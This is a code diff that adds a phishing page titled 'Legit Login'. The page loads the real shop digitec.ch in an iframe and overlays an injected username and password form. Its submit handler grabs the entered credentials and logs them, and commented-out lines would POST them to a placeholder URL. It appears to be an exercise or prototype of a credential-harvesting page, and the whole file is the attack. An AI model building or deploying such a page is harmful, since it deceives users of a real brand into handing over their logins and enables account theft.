@@ -1,0 +1,64 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Legit Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+    <iframe class='iframe' id='iframe', src='http://www.digitec.ch'></iframe>
+    <script type='text/javascript'>
+        var form = document.createElement('form');
+        form.setAttribute('method', 'POST');
+        form.setAttribute('accept-charset', 'utf-8');
+        form.setAttribute('action', '');
+        form.setAttribute('id', 'myform');
+
+        var input_username = document.createElement('input');
+        input_username.setAttribute('name', 'username');
+        input_username.setAttribute('type', 'text');
+        input_username.setAttribute('id', 'username');
+        
+        var input_password = document.createElement('input');
+        input_password.setAttribute('name', 'password');
+        input_password.setAttribute('type', 'password');
+        input_password.setAttribute('id', 'password');
+
+        var input_submit_button = document.createElement('input');
+        input_submit_button.setAttribute('name', 'submit');
+        input_submit_button.setAttribute('value', 'login');
+        input_submit_button.setAttribute('type', 'submit');
+
+        form.appendChild(input_username);
+        form.appendChild(document.createElement('br'));
+        form.appendChild(input_password);
+        form.appendChild(document.createElement('br'));
+        form.appendChild(document.createElement('br'));
+        form.appendChild(input_submit_button);
+        form.setAttribute('style', 'border; 1px solid red');
+
+        document.getElementsByTagName('body')[0].appendChild(form);
+
+        form.addEventListener('submit', function(e) {
+            console.log('hau eine useee');
+            e.preventDefault();
+            e.stopPropagation();
+
+            if (e.target && e.target.id === 'myform') {
+                var xhr = new XMLHttpRequest();
+
+                var username = document.getElementById('username').value;
+                var password = document.getElementById('password').value;
+
+                console.log('username=', username);
+                console.log('password=', password);
+
+                // xhr.open('POST', 'mockUrl');
+                // xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                // xhr.send('username=' + username + '&password=' + password);
+            }
+        });
+    </script>
+</body>
+</html>
